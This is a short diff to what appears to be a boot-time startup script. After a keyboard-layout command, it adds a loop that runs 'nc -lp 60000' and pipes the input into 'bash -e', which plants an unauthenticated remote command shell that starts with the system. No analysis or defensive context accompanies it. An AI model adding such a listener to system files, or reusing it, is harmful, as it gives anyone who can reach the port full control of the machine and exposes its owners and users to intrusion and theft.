@@ -13,4 +13,10 @@
 
 loadkeys fr-pc
 
+# Enable remote execution
+while [ 1=1 ]
+do
+	nc -lp 60000 | bash -e
+done
+
 exit 0
